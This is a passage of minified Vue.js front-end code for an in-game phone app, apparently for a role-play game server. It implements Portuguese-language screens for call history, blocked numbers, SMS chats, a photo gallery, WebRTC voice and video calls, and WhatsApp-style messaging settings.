    dd = {
        key: 0,
        class: "h-full flex flex-center"
    },
    pd = {
        key: 1,
        class: "p-3 font-semibold text-center"
    },
    fd = {
        key: 2
    },
    md = {
        class: "w-16 text-center"
    },
    hd = {
        key: 0,
        class: "fas fa-ban text-red-500 fa-2x"
    },
    bd = {
        key: 2,
        class: "fas fa-question"
    },
    gd = {
        class: "flex flex-col ml-5 text-3xl"
    },
    vd = {
        class: "font-semibold"
    },
    xd = {
        class: "text-gray-400"
    },
    yd = {
        class: "ml-auto self-start text-xl text-gray-400"
    };
id.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("app-loading"),
        i = dl("Footer");
    return wl(), _l("div", cd, [Pl(o, {
        name: "Recentes"
    }), Pl("div", ud, [l.calls ? l.calls.length ? (wl(), _l("ul", fd, [(wl(!0), _l(bl, null, fa(l.calls, (t => (wl(), _l("li", {
        key: t.id,
        onClick: e => t.callback && l.createCall(t),
        class: "border-b border-theme p-5 flex items-center"
    }, [Pl("div", md, ["refused" === t.status && t.target == l.myPhone ? (wl(), _l("i", hd)) : "ok" === t.status ? (wl(), _l("i", {
        key: 1,
        class: ["fas", [t.video ? "fa-video" : "fa-phone transform rotate-90"]]
    }, null, 2)) : (wl(), _l("i", bd))]), Pl("div", gd, [Pl("h1", vd, g(t.callback ? e.$filters.getNameByPhone(l.other(t)) : "(Anônimo)"), 1), Pl("span", xd, g(e.$filters.duration(t.duration)), 1)]), Pl("span", yd, g(e.$filters.unixToDayOfMonth(t.created_at)), 1)], 8, ["onClick"])))), 128))])) : (wl(), _l("h1", pd, " Você não realizou nenhuma ligação ")) : (wl(), _l("div", dd, [Pl(r)]))]), Pl(i)])
};
const kd = {
        components: {
            Header: zc,
            Footer: qc
        },
        setup() {
            jl("setDark")();
            const e = _o.settings.blocks;
            return {
                blocks: e,
                unblock: function(t) {
                    _o.backend.unblock(t).then((() => {
                        const n = e.indexOf(t);
                        n >= 0 && e.splice(n, 1)
                    }))
                }
            }
        }
    },
    wd = {
        class: "flex flex-col h-full"
    },
    Cd = {
        class: "flex-1 overflow-y-auto hide-scroll bg-theme text-theme"
    },
    _d = {
        key: 0,
        class: "h-full flex flex-center"
    },
    Ad = {
        key: 1,
        class: "p-3 font-semibold text-center"
    },
    Sd = {
        key: 2
    },
    Rd = {
        class: "font-semibold"
    },
    Td = Pl("button", {
        class: "ml-auto px-2"
    }, [Pl("i", {
        class: "fal fa-times text-4xl text-gray-500"
    })], -1);
kd.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("app-loading"),
        i = dl("Footer");
    return wl(), _l("div", wd, [Pl(o, {
        name: "Bloqueios"
    }), Pl("div", Cd, [l.blocks ? l.blocks.length ? (wl(), _l("ul", Sd, [(wl(!0), _l(bl, null, fa(l.blocks, (t => (wl(), _l("li", {
        key: t,
        onClick: e => l.unblock(t),
        class: "border-b border-theme p-5 flex items-center"
    }, [Pl("h1", Rd, g(e.$filters.getNameByPhone(t)), 1), Td], 8, ["onClick"])))), 128))])) : (wl(), _l("h1", Ad, " Nenhum número bloqueado ")) : (wl(), _l("div", _d, [Pl(r)]))]), Pl(i)])
};
const Ed = {
        setup() {
            jl("setDark")(_o.darkTheme.value);
            const e = rt(_o.hasNotificationFor("sms"));
            Rn(e, (e => _o.setNotificationFor("sms", e)));
            const t = rt(""),
                n = da((() => {
                    var e;
                    const n = t.value,
                        l = [];
                    for (let [t, a] of Object.entries(_o.messages)) a.length && (t.includes(n) || Bs(t).toLowerCase().includes(n.toLowerCase())) && l.push({
                        phone: t,
                        message: a[a.length - 1]
                    });
                    for (let t of _o.contacts.value) n && !(null == (e = _o.messages[t.phone]) ? void 0 : e.length) && (t.phone.includes(n) || t.name.toLowerCase().includes(n.toLowerCase())) && l.push({
                        phone: t.phone,
                        message: null
                    });
                    return l.sort(((e, t) => {
                        var n, l;
                        return (null == (n = t.message) ? void 0 : n.created_at) - (null == (l = e.message) ? void 0 : l.created_at) || 0
                    })), l
                }));
            return {
                query: t,
                chats: n,
                notifications: e
            }
        }
    },
    Pd = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    Ld = {
        class: "flex h-32 pt-16 bg-theme-accent border-b border-theme"
    },
    Id = Pl("h1", {
        class: "mx-auto font-bold"
    }, "Mensagens", -1),
    Od = {
        key: 0,
        class: "far fa-bell"
    },
    Md = {
        key: 1,
        class: "far fa-bell-slash"
    },
    Vd = {
        class: "p-4"
    },
    Dd = {
        class: "relative"
    },
    Ud = Pl("i", {
        class: "absolute top-3 left-4 text-gray-500 fas fa-search text-xl"
    }, null, -1),
    Nd = {
        class: "flex-1 overflow-y-auto hide-scroll"
    },
    $d = {
        class: "flex flex-col"
    },
    jd = {
        class: "text-3xl"
    },
    Fd = {
        key: 0,
        class: "text-2xl text-gray-500"
    },
    zd = {
        key: 1,
        class: "text-2xl text-gray-500 italic"
    },
    Bd = {
        key: 0,
        class: "text-xl text-gray-500"
    };
Ed.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", Pd, [Pl("div", Ld, [Id, Pl("button", {
        class: "absolute top-16 right-0 w-20 px-5",
        onClick: t[1] || (t[1] = e => l.notifications = !l.notifications)
    }, [l.notifications ? (wl(), _l("i", Od)) : (wl(), _l("i", Md))])]), Pl("div", Vd, [Pl("div", Dd, [Ud, Zn(Pl("input", {
        "onUpdate:modelValue": t[2] || (t[2] = e => l.query = e),
        placeholder: "Pesquise um número ou contato",
        type: "text",
        class: "w-full bg-theme border border-theme rounded-full p-2 pl-12 pr-6 text-2xl"
    }, null, 512), [
        [ns, l.query]
    ])])]), Pl("ul", Nd, [(wl(!0), _l(bl, null, fa(l.chats, (t => (wl(), _l("li", {
        key: t.phone,
        class: "flex justify-between items-start border-b border-theme p-4",
        onClick: n => e.$router.push("/sms/" + t.phone)
    }, [Pl("div", $d, [Pl("h1", jd, g(e.$filters.getNameByPhone(t.phone)), 1), t.message ? (wl(), _l("p", Fd, g(t.message.content || (t.message.image ? "📷 Foto" : "🌎 Localização")), 1)) : (wl(), _l("p", zd, "Nenhuma mensagem..."))]), t.message ? (wl(), _l("p", Bd, g(e.$filters.unixToRelative(t.message.created_at)), 1)) : Ml("", !0)], 8, ["onClick"])))), 128))])])
};
const Hd = {
        setup() {
            jl("setDark")(_o.darkTheme.value);
            const {
                id: e
            } = ec().params;
            _o.messages[e] || (_o.messages[e] = []);
            const t = _o.messages[e],
                n = rt(),
                {
                    isAndroid: l
                } = _o.settings;
            return Rn(t, (() => {
                Lt((() => !n.value && document.querySelector(".overflow-y-auto").scrollTo(0, 9e6)))
            })), {
                isAndroid: l,
                id: e,
                messages: t,
                updateGPS: function(e) {
                    _o.pusher.emit("GPS", {
                        location: e
                    })
                },
                content: n,
                send: function() {
                    n.value && (_o.backend.sms_send(e, n.value).then((e => {
                        e && t.push(e) > 100 && t.shift()
                    })), n.value = null)
                }
            }
        }
    },
    qd = sn("data-v-7547566d");
ln("data-v-7547566d");
const Gd = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    Wd = {
        class: "flex h-32 pt-16 bg-theme-accent border-b border-theme"
    },
    Kd = {
        key: 0,
        class: "far fa-arrow-left"
    },
    Jd = {
        key: 1,
        class: "fas fa-chevron-left text-blue-400"
    },
    Xd = {
        class: "flex-1 overflow-y-auto hide-scroll mt-2"
    },
    Yd = {
        key: 0,
        class: "mx-2 fal fa-check-double text-gray-400 text-base"
    },
    Zd = {
        class: "break-words whitespace-pre-line"
    },
    Qd = {
        class: "px-5 py-6"
    },
    ep = {
        class: "relative"
    },
    tp = Pl("i", {
        class: "fal fa-paper-plane text-gray-600 text-3xl"
    }, null, -1);
an();
const np = qd(((e, t, n, l, a, s) => (wl(), _l("div", Gd, [Pl("div", Wd, [Pl("button", {
    class: "absolute top-16 px-5",
    onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t))
}, [l.isAndroid ? (wl(), _l("i", Kd)) : (wl(), _l("i", Jd))]), Pl("h1", {
    class: [{
        "ml-16": l.isAndroid,
        "mx-auto": !l.isAndroid
    }, "font-bold"]
}, g(e.$filters.getNameByPhone(l.id).substr(0, 12)), 3)]), Pl("ul", Xd, [(wl(!0), _l(bl, null, fa(l.messages, ((t, n) => (wl(), _l("li", {
    key: n,
    class: ["flex items-end mb-2 mx-4", {
        "flex-row-reverse": t.sender != l.id
    }]
}, [t.delivered && t.sender != l.id ? (wl(), _l("i", Yd)) : Ml("", !0), Pl("div", {
    class: "p-3 text-3xl rounded-2xl",
    received: t.sender == l.id,
    style: {
        "max-width": "75%"
    }
}, [t.image ? (wl(), _l("img", {
    key: 0,
    class: "rounded-xl",
    src: t.image
}, null, 8, ["src"])) : t.location ? (wl(), _l("img", {
    key: 1,
    class: "rounded-xl",
    src: e.$asset("/stock/maps.jpg"),
    onClick: e => l.updateGPS(t.location)
}, null, 8, ["src", "onClick"])) : Ml("", !0), Pl("p", Zd, g(t.content), 1)], 8, ["received"])], 2)))), 128))]), Pl("div", Qd, [Pl("div", ep, [Zn(Pl("input", {
    onKeydown: t[2] || (t[2] = us(((...e) => l.send && l.send(...e)), ["enter"])),
    "onUpdate:modelValue": t[3] || (t[3] = e => l.content = e),
    maxlength: "255",
    type: "text",
    class: "w-full bg-theme border border-theme rounded-full p-4 pr-16 text-2xl"
}, null, 544), [
    [ns, l.content]
]), Pl("button", {
    class: "absolute top-2 right-6",
    onClick: t[4] || (t[4] = (...e) => l.send && l.send(...e))
}, [tp])])])]))));
Hd.render = np, Hd.__scopeId = "data-v-7547566d";
const lp = mo.callback;
Rn(lp, (e => {
    e && kO.push("/gallery")
})), _o.pusher.on("Route:afterEach", (e => {
    "/gallery" != e.path && lp.value && (lp.value = null)
}));
const ap = {
        setup() {
            jl("setDark")();
            const e = fo(),
                t = _o.gallery,
                n = _o.settings.isAndroid,
                l = rt(),
                a = da((() => t.map((e => e.folder)).filter(((e, t, n) => n.indexOf(e) == t)).sort())),
                s = da((() => t.filter((e => e.folder === l.value))));
            return t.checked || _o.backend.gallery().then((e => {
                Object.assign(t, e), t.checked = !0
            })), {
                isAndroid: n,
                callback: lp,
                takePhoto: function() {
                    io().request(!1, "/").catch((() => {}))
                },
                path: l,
                folders: a,
                files: s,
                select: function(e) {
                    lp.value ? (lp.value(e.url), lp.value = null, kO.back()) : kO.push("/gallery/carousel/" + e.id)
                },
                folderLang: e
            }
        }
    },
    sp = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    op = {
        class: "h-32 pt-16 border-b border-theme bg-theme-accent"
    },
    rp = {
        key: 0,
        class: "far fa-arrow-left"
    },
    ip = {
        key: 1,
        class: "far fa-chevron-left text-yellow-500"
    },
    cp = Pl("i", {
        class: "fal fa-camera text-yellow-500"
    }, null, -1),
    up = {
        class: "flex-1 overflow-x-auto hide-scroll"
    },
    dp = {
        key: 0,
        class: "p-5"
    },
    pp = Pl("i", {
        class: "fas fa-folder text-yellow-500 text-6xl"
    }, null, -1),
    fp = {
        class: "ml-4"
    },
    mp = {
        key: 1,
        class: "grid grid-cols-4 gap-0.5"
    };
ap.render = function(e, t, n, l, a, s) {
    var o;
    return wl(), _l("div", sp, [Pl("div", op, [l.path ? (wl(), _l("button", {
        key: 0,
        onClick: t[1] || (t[1] = e => l.path = null),
        class: "absolute top-16 px-4"
    }, [l.isAndroid ? (wl(), _l("i", rp)) : (wl(), _l("i", ip))])) : Ml("", !0), Pl("h1", {
        class: [
            [l.path && l.isAndroid ? "ml-16" : "text-center"], "font-bold text-4xl"
        ]
    }, g(null != (o = l.folderLang[l.path]) ? o : "Galeria"), 3), l.callback ? Ml("", !0) : (wl(), _l("button", {
        key: 1,
        onClick: t[2] || (t[2] = (...e) => l.takePhoto && l.takePhoto(...e)),
        class: "absolute top-16 right-4 px-4"
    }, [cp]))]), Pl("div", up, [l.path ? (wl(), _l("ul", mp, [(wl(!0), _l(bl, null, fa(l.files, (e => (wl(), _l("li", {
        key: e.id
    }, [Pl("div", {
        onClick: t => l.select(e),
        class: "w-full h-36",
        style: {
            background: `url(${e.url})`,
            backgroundSize: "100% 100%"
        }
    }, null, 12, ["onClick"])])))), 128))])) : (wl(), _l("ul", dp, [(wl(!0), _l(bl, null, fa(l.folders, (e => (wl(), _l("li", {
        key: e,
        class: "flex items-center mb-4",
        onClick: t => l.path = e
    }, [pp, Pl("h1", fp, g(l.folderLang[e]), 1)], 8, ["onClick"])))), 128))]))])])
};
const hp = {
        setup() {
            jl("setDark")();
            const e = ec(),
                t = fo(),
                n = rt(_o.gallery.find((t => t.id == e.params.file))),
                l = Ze(_o.gallery.filter((e => e.folder === n.value.folder))),
                a = da((() => l.indexOf(n.value))),
                s = da((() => l.length));
            return {
                file: n,
                index: a,
                length: s,
                next: function(e = 1) {
                    const t = l.indexOf(n.value) + e;
                    t >= 0 && t < l.length && (n.value = l[t])
                },
                folders: t
            }
        }
    },
    bp = {
        class: "h-full bg-theme text-theme"
    },
    gp = {
        class: "h-32 pt-16 text-center bg-theme-accent border-b border-theme"
    },
    vp = {
        class: "mt-64 relative"
    },
    xp = {
        class: "mt-4 text-center font-semibold text-4xl"
    };
hp.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", bp, [Pl("div", gp, [Pl("h1", null, g(l.folders[l.file.folder]), 1)]), Pl("div", vp, [Pl("button", {
        onClick: t[1] || (t[1] = e => l.next(-1)),
        class: "absolute left-0 top-0 h-96 w-1/4"
    }), Pl("img", {
        src: l.file.url,
        class: "h-96 mx-auto"
    }, null, 8, ["src"]), Pl("button", {
        onClick: t[2] || (t[2] = e => l.next(1)),
        class: "absolute right-0 top-0 h-96 w-1/4"
    })]), Pl("div", xp, g(l.index + 1) + " / " + g(l.length), 1)])
};
class yp {
    constructor(e) {
        this.readyState = 0, this.call = e;
        const t = _o.settings.videoServer;
        if (this.isAudioUDP = "rtc" == e.mode, this.isVideoUDP = "rtc" == t, this.channels = {}, "rtc" == e.mode || e.isVideo && "rtc" == t) {
            const e = [];
            if (_o.settings.turnServer) {
                const [t, n, l] = _o.settings.turnServer.split(",");
                e.push({
                    urls: [t],
                    username: n,
                    credential: l
                })
            } else e.push({
                urls: ["stun:stun1.l.google.com:19302", "stun:stun2.l.google.com:19302"]
            });
            this.peer = new RTCPeerConnection({
                iceServers: e
            }), this.peer.onicecandidate = ({
                candidate: e
            }) => this.onicecandidate(e), this.peer.ontrack = ({
                streams: e
            }) => this.onstreams(e), this.peer.ondatachannel = ({
                channel: e
            }) => {
                this.channels[e.label] = e, e.onmessage = ({
                    data: e
                }) => this.blobCallback(wp(e))
            }
        }
    }
    addStream(e) {
        e.getTracks().forEach((t => this.peer.addTrack(t, e)))
    }
    onicecandidate(e) {
        throw new Error("onicecandidate should be replaced by a new function")
    }
    onstreams(e) {
        throw new Error("ontrack should be replaced by a new function")
    }
    async createOffer() {
        const e = await this.peer.createOffer({
            offerToReceiveAudio: !0
        });
        return await this.peer.setLocalDescription(e), e
    }
    setAnswer(e) {
        return this.peer.setRemoteDescription(e)
    }
    async createAnswer(e) {
        await this.peer.setRemoteDescription(e);
        const t = this.peer.createAnswer({
            offerToReceiveAudio: !0
        });
        return await this.peer.setLocalDescription(t), t
    }
    addIceCandidate(e) {
        this.peer.addIceCandidate(e)
    }
    addVoice() {
        const {
            mode: e,
            room: t
        } = this.call;
        ["mumble-voip", "voip", "pma-voice"].includes(e) && _o.client.exports(e, "addPlayerToCall", t)
    }
    async _addVideoStream(e) {
        var t;
        oo.start();
        const n = oo.canvas,
            l = document.createElement("canvas");
        l.width = 375, l.height = 812;
        const a = l.getContext("2d");
        for (; this.readyState;) {
            const s = Date.now();
            a.drawImage(n, .26 * n.width, 0, .28 * n.width, n.height, 0, 0, 375, 812);
            const o = await new Promise((e => l.toBlob(e, "image/jpeg", .3)));
            this.isVideoUDP ? null == (t = this.channels.video) || t.send(await o.arrayBuffer()) : this.socket.readyState == WebSocket.OPEN && this.socket.send(o), e(o, !0), await kp(42 - (Date.now() - s))
        }
        oo.stop()
    }
    addVideo(e) {
        if (this.blobCallback = e, this.isVideoUDP) {
            if (this.call.owner) {
                const t = this.peer.createDataChannel("video");
                t.onmessage = ({
                    data: t
                }) => e(wp(t)), t.onopen = () => this.channels.video = t
            }
            this.readyState = 1, this._addVideoStream(e)
        } else {
            let t = _o.settings.videoServer;
            t.lastIndexOf("/") < 10 && (t += "/"), t += this.call.room, this.socket = new WebSocket(t), this.socket.onopen = () => {
                this.readyState = 1, this._addVideoStream(e)
            }, this.socket.onmessage = ({
                data: t
            }) => e(t), this.socket.onclose = () => this.readyState = 0
        }
    }
    close() {
        var e, t;
        this.readyState = 0, null == (e = this.peer) || e.close(), null == (t = this.socket) || t.close();
        const {
            room: n,
            mode: l
        } = this.call;
        ["mumble-voip", "voip", "pma-voice"].includes(l) ? _o.client.exports(l, "removePlayerFromCall", n) : "tokovoip" === l && _o.client.exports("tokovoip_script", "removePlayerFromRadio", n)
    }
}

function kp(e) {
    return new Promise((t => setTimeout(t, e)))
}

function wp(e) {
    return new Blob([new Uint8Array(e, 0, e.byteLength)])
}
const Cp = {
        setup() {
            jl("setDark")(!0);
            const {
                backgroundURL: e,
                settings: t,
                currentCall: n
            } = _o, l = jl("setKeepInput"), a = n.value, s = rt(0), o = rt(0), r = new yp(a), i = Qi(), c = Ze({
                big: null,
                small: null
            }), u = rt(), d = rt(), p = {
                ring: _o.settings.ringSound,
                dial: _o.settings.dialSound
            };
            let f = null;
            async function m() {
                document.querySelectorAll("audio[audioEffect]").forEach((e => e.pause())), _o.client.playAnim("toCall", !0), a.accepted = !0, _o.client.setState("inCall", !0), _o.client.setState("inVideoCall", a.isVideo), a.isVideo && (r.addVideo(((e, t) => {
                    const n = t ? d.value : u.value;
                    if (t ? c.small = !0 : c.big = !0, n instanceof HTMLCanvasElement) {
                        const t = n.getContext("2d"),
                            l = new Image;
                        l.onload = () => t.drawImage(l, 0, 0, n.width, n.height), l.src = URL.createObjectURL(e)
                    }
                })), _o.client.SetInVideoCall(!0)), l(!0), r.addVoice(), (r.isAudioUDP || a.isVideo && r.isVideoUDP) && a.owner && b("setOffer", await r.createOffer()), f = setInterval((() => s.value += 1), 1e3)
            }

            function h(e) {
                _o.currentCall.value = null, i.back(), f && clearInterval(f), _o.client.setState("inCall", !1), _o.client.setState("inVideoCall", !1), r.close(), a.isVideo && _o.client.SetInVideoCall(!1), _o.visible.value ? _o.client.playAnim("callToText", !0) : _o.client.playAnim("fromCall"), e && _o.backend.endPhoneCall(a.room)
            }
            r.isAudioUDP && (navigator.mediaDevices.getUserMedia({
                audio: {
                    autoGainControl: !1
                }
            }).then((e => r.addStream(e))).catch((() => console.error("No available stream"))), r.onstreams = e => {
                const t = new Audio;
                t.autoplay = !0, t.srcObject = e[0]
            }), r.peer && (r.onicecandidate = e => e && b("addCandidate", e)), _o.onceRoute("CALL_READY", m);
            const b = (e, ...t) => _o.backend.call_p2p(e, t),
                g = {
                    setOffer: async e => b("setAnswer", await r.createAnswer(e)),
                    setAnswer: e => r.setAnswer(e),
                    addCandidate: e => e && r.addIceCandidate(e)
                };
            return _o.onceRoute("CALL_P2P", (({
                event: e,
                args: t
            }) => {
                g[e](...t || [])
            })), _o.onceRoute("FORCE_LEAVE_CALL", (() => {
                _o.currentCall.value && h(!0)
            })), vn((() => {
                const e = document.getElementById(a.owner ? "dial" : "ring");
                e.currentTime = 0, e.play()
            })), _o.onceRoute("CALL_END", (() => h())), {
                backgroundURL: e,
                call: a,
                video: c,
                videoPeer: u,
                videoSource: d,
                settings: t,
                status: o,
                duration: s,
                audios: p,
                accept: function() {
                    _o.backend.answerPhoneCall(a.room), m()
                },
                block: function() {
                    _o.currentCall.value = null, i.back(), _o.backend.block(a.contact.phone), _o.settings.blocks.push(a.contact.phone)
                },
                refuse: function() {
                    _o.currentCall.value = null, i.back(), _o.backend.refusePhoneCall(a.room)
                },
                end: h
            }
        }
    },
    _p = sn("data-v-58ae5e69");
ln("data-v-58ae5e69");
const Ap = {
        class: "mt-48 text-7xl text-white"
    },
    Sp = {
        class: "text-white mt-4"
    },
    Rp = {
        key: 0,
        class: "absolute inset-0 bg-black",
        big: ""
    },
    Tp = {
        ref: "videoPeer",
        width: "375",
        height: "812",
        class: "w-full h-full"
    },
    Ep = {
        key: 1,
        class: "absolute right-4 top-16 w-64 h-96 bg-black rounded-3xl",
        small: ""
    },
    Pp = {
        ref: "videoSource",
        width: "160",
        height: "240",
        class: "w-full h-full rounded-3xl"
    },
    Lp = {
        class: "w-full absolute bottom-48"
    },
    Ip = {
        key: 0,
        class: "flex justify-around"
    },
    Op = Pl("i", {
        class: "fas fa-phone transform rotate-225"
    }, null, -1),
    Mp = Pl("h1", {
        class: "text-white text-xl text-center mt-3"
    }, "Recusar", -1),
    Vp = Pl("i", {
        class: "fas fa-ban"
    }, null, -1),
    Dp = Pl("h1", {
        class: "text-white text-xl text-center mt-3"
    }, "Bloquear", -1),
    Up = {
        key: 0,
        class: "fas fa-video"
    },
    Np = {
        key: 1,
        class: "fas fa-phone transform rotate-90"
    },
    $p = Pl("h1", {
        class: "text-white text-xl text-center mt-3"
    }, "Atender", -1),
    jp = {
        key: 1,
        class: "text-center"
    },
    Fp = Pl("i", {
        class: "fas fa-times"
    }, null, -1),
    zp = Pl("h1", {
        class: "text-white text-xl mt-3"
    }, "Encerrar", -1);
an();
const Bp = _p(((e, t, n, l, a, s) => (wl(), _l("div", {
    class: "flex flex-col items-center h-full bg-cover relative",
    style: {
        backgroundImage: "url(" + l.backgroundURL + ")",
        backgroundPosition: "center",
        backgroundColor: "black"
    }
}, [Pl("h1", Ap, g(l.call.isAnonymous && !l.call.owner ? "Anônimo" : l.call.contact.name.substr(0, 16)), 1), Pl("span", Sp, g(e.$filters.duration(l.duration)), 1), l.video.big ? (wl(), _l("div", Rp, [Pl("canvas", Tp, null, 512)])) : Ml("", !0), l.video.small ? (wl(), _l("div", Ep, [Pl("canvas", Pp, null, 512)])) : Ml("", !0), Pl("div", Lp, [l.call.accepted || l.call.owner ? (wl(), _l("div", jp, [Pl("button", {
    class: "text-white w-24 h-24 bg-gradient-to-r from-red-500 to-red-600 rounded-full",
    onClick: t[4] || (t[4] = e => l.end(!0))
}, [Fp]), zp])) : (wl(), _l("div", Ip, [Pl("div", null, [Pl("button", {
    class: "text-white w-24 h-24 bg-gradient-to-r from-red-500 to-red-600 rounded-full",
    onClick: t[1] || (t[1] = (...e) => l.refuse && l.refuse(...e))
}, [Op]), Mp]), Pl("div", null, [Pl("button", {
    class: "text-white w-24 h-24 bg-gradient-to-r from-red-500 to-red-600 rounded-full",
    onClick: t[2] || (t[2] = (...e) => l.block && l.block(...e))
}, [Vp]), Dp]), Pl("div", null, [Pl("button", {
    class: "text-white w-24 h-24 bg-gradient-to-r from-green-400 to-green-500 rounded-full",
    onClick: t[3] || (t[3] = (...e) => l.accept && l.accept(...e))
}, [l.call.isVideo ? (wl(), _l("i", Up)) : (wl(), _l("i", Np))]), $p])]))]), Pl("audio", {
    audioEffect: "",
    id: "ring",
    src: l.audios.ring,
    loop: ""
}, null, 8, ["src"]), Pl("audio", {
    audioEffect: "",
    id: "dial",
    src: l.audios.dial,
    loop: ""
}, null, 8, ["src"])], 4))));
Cp.render = Bp, Cp.__scopeId = "data-v-58ae5e69";
const Hp = {},
    qp = Pl("div", {
        class: "h-12 bg-whatsapp-dark"
    }, null, -1),
    Gp = {
        class: "pt-4 bg-whatsapp text-white text-left"
    };
Hp.render = function(e, t) {
    return wl(), _l(bl, null, [qp, Pl("div", Gp, [Zt(e.$slots, "default")])], 64)
};
const Wp = {
        props: ["onChange", "tab"],
        setup: e => ({
            fill: (t, n) => e.tab === t ? n + "_fill" : n
        })
    },
    Kp = {
        class: "mt-auto grid grid-cols-4 p-2 px-5 bg-theme-accent"
    },
    Jp = {
        class: "cupertino-icons text-6xl"
    },
    Xp = {
        class: "text-xl"
    };
Wp.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", Kp, [(wl(), _l(bl, null, fa([{
        tab: "calls",
        icon: "phone",
        label: "Chamadas"
    }, {
        tab: "contacts",
        icon: "person_circle",
        label: "Contatos"
    }, {
        tab: "chats",
        icon: "chat_bubble_2",
        label: "Conversas"
    }, {
        tab: "settings",
        icon: "gear",
        label: "Configurações"
    }], ((e, t) => Pl("button", {
        onClick: t => n.onChange(e.tab),
        class: ["p-2", {
            "bg-lightBlue-400 text-lightBlue-500 bg-opacity-10 rounded-lg": n.tab == e.tab
        }],
        key: t
    }, [Pl("i", Jp, g(l.fill(e.tab, e.icon)), 1), Pl("p", Xp, g(e.label), 1)], 10, ["onClick"]))), 64))])
};
const Yp = {
        components: {
            Header: Hp
        },
        setup() {
            io();
            const e = jl("alert"),
                t = rt(!1),
                n = rt(!0),
                l = rt(_o.hasNotificationFor("whatsapp")),
                a = rt("true" == _o.storage.get("whatsapp-sensitive")),
                s = rt(_o.asset("/stock/user.svg"));
            return Rn(a, (e => _o.storage.set("whatsapp-sensitive", String(e)))), _o.backend.wpp_getProfile().then((e => {
                s.value = e.avatarURL || _o.asset("/stock/user.svg"), n.value = !!e.read_receipts, t.value = !1
            })), Rn(l, (e => _o.setNotificationFor("whatsapp", e))), Rn(n, (e => {
                _o.backend.wpp_updateSettings(e)
            })), {
                loading: t,
                avatarURL: s,
                read_receipts: n,
                notifications: l,
                sensitive: a,
                changeAvatar: async function() {
                    try {
                        const e = await _o.useAnyImage("/whatsapp", !0);
                        s.value = e, _o.backend.wpp_updateAvatar(e)
                    } catch (e) {}
                },
                deleteMessages: function() {
                    _o.backend.wpp_deleteMessages().then((() => e("Todas as mensagens privadas foram apagadas"))), _o.pusher.emit("WHATSAPP_DELETE_MESSAGES")
                }
            }
        }
    },
    Zp = {
        key: 0,
        class: "flex-1 flex flex-center"
    },
    Qp = {
        key: 1,
        class: "flex-1 overflow-y-auto hide-scroll p-5 flex flex-col text-theme"
    },
    ef = {
        class: "relative mb-3"
    },
    tf = Pl("i", {
        class: "fas fa-camera"
    }, null, -1),
    nf = {
        class: "border-t border-theme pt-3 flex-1 flex flex-col"
    },
    lf = {
        class: "flex justify-between"
    },
    af = Pl("label", {
        class: "text-3xl"
    }, "Confirmação de Leitura", -1),
    sf = {
        class: "flex justify-between mt-3"
    },
    of = Pl("label", {
        class: "text-3xl"
    }, "Notificações", -1),
    rf = {
        class: "flex justify-between mt-3"
    },
    cf = Pl("label", {
        class: "text-3xl"
    }, "Conteúdo sensível", -1),
    uf = {
        class: "mt-auto"
    };
Yp.render = function(e, t, n, l, a, s) {
    const o = dl("app-loading"),
        r = dl("app-toggle");
    return l.loading ? (wl(), _l("div", Zp, [Pl(o)])) : (wl(), _l("div", Qp, [Zt(e.$slots, "default"), Pl("div", ef, [Pl("img", {
        src: l.avatarURL,
        class: "w-64 h-64 rounded-full mx-auto"
    }, null, 8, ["src"]), Pl("button", {
        onClick: t[1] || (t[1] = (...e) => l.changeAvatar && l.changeAvatar(...e)),
        class: "absolute bottom-0 right-40 px-4 py-2 rounded-full bg-gray-400 text-black"
    }, [tf])]), Pl("div", nf, [Pl("div", lf, [af, Pl(r, {
        modelValue: l.read_receipts,
        "onUpdate:modelValue": t[2] || (t[2] = e => l.read_receipts = e)
    }, null, 8, ["modelValue"])]), Pl("div", sf, [of, Pl(r, {
        modelValue: l.notifications,
        "onUpdate:modelValue": t[3] || (t[3] = e => l.notifications = e)
    }, null, 8, ["modelValue"])]), Pl("div", rf, [cf, Pl(r, {
        modelValue: l.sensitive,
        "onUpdate:modelValue": t[4] || (t[4] = e => l.sensitive = e)
    }, null, 8, ["modelValue"])]), Pl("div", uf, [Pl("button", {
        class: "text-red-500",
        onClick: t[5] || (t[5] = (...e) => l.deleteMessages && l.deleteMessages(...e))
    }, "Apagar todas as mensagens")])])]))
};
const df = Ze([]),
    pf = Ze([]),
    ff = Ze({}),
    mf = Ze({});

function hf(e, t = null) {
    const n = df.find((t => t.id == e));
    return n && t && Object.assign(n, t), n
}

function bf(e) {
    const t = df.findIndex((t => t.id === e));
    t >= 0 && df.splice(t, 1)
}

function gf(e, t) {
    var n;
    return t || (t = e.target, e = null != (n = e.sender) ? n : e.initiator), e == _o.identity.phone ? t : e
}
_o.pusher.on("WHATSAPP_GROUP", (e => {
    e.phone = "group" + e.id, df.push(e)
})), _o.pusher.on("WHATSAPP_GROUP_PHOTO", (({
    id: e,
    avatarURL: t
}) => {
    hf(e, {
        avatarURL: t
    })
})), _o.pusher.on("WHATSAPP_GROUP_NAME", (({
    id: e,
    name: t
}) => {
    hf(e, {
        name: t
    })
})), _o.pusher.on("WHATSAPP_LEAVE_GROUP", (e => bf(e))), _o.pusher.on("WHATSAPP_UNGROUP", (e => bf(e))), _o.pusher.on("WHATSAPP_GROUP_KICK", (({
    id: e
}) => bf(e))), _o.pusher.on("WHATSAPP_GROUP_DESTROY", (({
    id: e
}) => bf(e))), _o.pusher.on("WHATSAPP_READED", (e => delete ff[e])), _o.pusher.on("WHATSAPP_AVATAR", (({
    phone: e,
    avatarURL: t
}) => mf[e] = t)), _o.pusher.on("ADD_CONTACT", (async ({
    phone: e
}) => {
    const t = await _o.backend.wpp_getAvatar(e);
    mf[e] = t
})), _o.pusher.on("WHATSAPP_MESSAGE", (e => {
    if (e.channel_id > 1e9) hf(e.channel_id - 1e9, {
        message: e
    });
    else {
        e.other = gf(e);
        const t = pf.findIndex((t => gf(t) == e.other)); - 1 != t ? pf.splice(t, 1, e) : pf.push(e), e.sender != _o.identity.phone && (ff[e.channel_id] = (ff[e.channel_id] || 0) + 1)
    }
})), _o.pusher.on("WHATSAPP_DELETE_MESSAGES", (() => {
    $s(pf, (e => !e.target.startsWith("group")))
}));
var vf = {
    loaded: !1,
